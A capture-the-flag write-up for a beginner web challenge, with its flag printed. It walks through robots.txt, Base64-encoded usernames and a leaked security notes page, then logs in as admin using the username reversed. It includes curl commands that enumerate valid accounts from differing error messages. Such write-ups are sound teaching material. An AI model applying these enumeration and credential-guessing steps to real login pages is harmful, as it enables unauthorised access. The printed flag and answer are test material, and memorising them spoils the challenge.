## Description : 

Welcome to our lovely new login page 💕. The developers swear it’s secure… but they may have forgotten to clean up a few things before launch. 
Can you figure out how authentication works and log in as the right user? 
P.S. please follow my wishes and do not scrape it...

https://broncoctf-lovely-login.chals.io/

## Flag : bronco{R3v3rs1ng_1s_S3cure}

## Solution

When I opened the challenge website, I saw a simple login page with two input boxes:

- Username
- Password

The page sends the login request to the `/login` endpoint using JavaScript.

```javascript
fetch("/login", {
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    body: JSON.stringify({
        username: u,
        password: p
    })
});
```

This tells us that the login is handled by the backend using a JSON request.

---

- Check robots.txt

The challenge description said:

> "Please do not scrape it..."

This made me think about checking the `robots.txt` file because it is commonly used to tell web crawlers which pages should not be indexed.

I opened:

```
https://broncoctf-lovely-login.chals.io/robots.txt
```

or

```bash
curl https://broncoctf-lovely-login.chals.io/robots.txt
```

The output was:

```
User-agent: *
Disallow: /security

# amVmZixzYXJhaCx hZG1pbixndWVzdA==
```

The important things here were:

- `/security`
- Base64 encoded text

---

- Decode the Base64

I decoded the Base64 strings.

```
amVmZixzYXJhaCx
```

decoded to

```
jeff,sarah,
```

The second string was intended to decode to

```
admin,guest
```

Now I had four usernames.

```
jeff
sarah
admin
guest
```

---

- Verify Existing Users

Next, I checked whether these usernames actually existed.

I tried logging in as **admin** with a random password.

```bash
curl -X POST https://broncoctf-lovely-login.chals.io/login \
-H "Content-Type: application/json" \
-d '{"username":"admin","password":"test"}'
```

Response:

```
Wrong password
```

Then I tried a fake username.

```bash
curl -X POST https://broncoctf-lovely-login.chals.io/login \
-H "Content-Type: application/json" \
-d '{"username":"randomuser","password":"test"}'
```

Response:

```
No such user
```

This showed that:

- `admin` is a valid user.
- Invalid usernames return "No such user."

---

 - Visit the Hidden Page

The `robots.txt` file also contained:

```
Disallow: /security
```

Since the challenge specifically said **not to scrape**, manually visiting this page was clearly intended.

I opened:

```
https://broncoctf-lovely-login.chals.io/security
```

The page contained:

```html
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -i https://broncoctf-lovely-login.chals.io/security
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 387
ETag: W/"183-J2oTQIEUSSJHE7rKY5HYGhBRDIg"
Date: Sat, 11 Jul 2026 18:32:02 GMT
Connection: keep-alive
Keep-Alive: timeout=5


    <h1>Internal Security Notes</h1>

    <p><b>Status:</b> Work in progress</p>

    <ul>
      <li>Passwords are derived from usernames</li>
      <li>Current implementation stores them backwards for obfuscation</li>
      <li>Planned upgrade: hashing + salting</li>
    </ul>

    <p style="color:black;">
      <b>TODO:</b> remove this page before production deployment!
    </p>

```

This was the biggest clue.

---

- Understand the Hint

The security notes explained that:

- Passwords come from usernames.
- They are stored **backwards**.

That means the password is simply the username written in reverse.

For example:

| Username | Password |
|----------|----------|
| jeff     | ffej     |
| sarah    | haras    |
| guest    | tseug    |
| admin    | nimda    |

Since `admin` is a valid account, its password should be:

```
nimda
```

---

- Login 

Go to the webiste: 
```
username : admin
password : nimda
```
The server accepted the login and returned the flag.

---

# Flag

```
bronco{R3v3rs1ng_1s_S3cure}
```


# Conclusion

This was an easy web challenge that focused on finding hidden information rather than exploiting a vulnerability.

The challenge provided several hints:

1. The challenge description suggested checking `robots.txt`.
2. `robots.txt` revealed hidden usernames and the `/security` page.
3. The `/security` page explained that passwords were simply reversed usernames.
4. Logging in as `admin` with the reversed password (`nimda`) revealed the flag.

This challenge was a good reminder that leaving development notes and weak password storage methods in production applications can completely break authentication security.

---
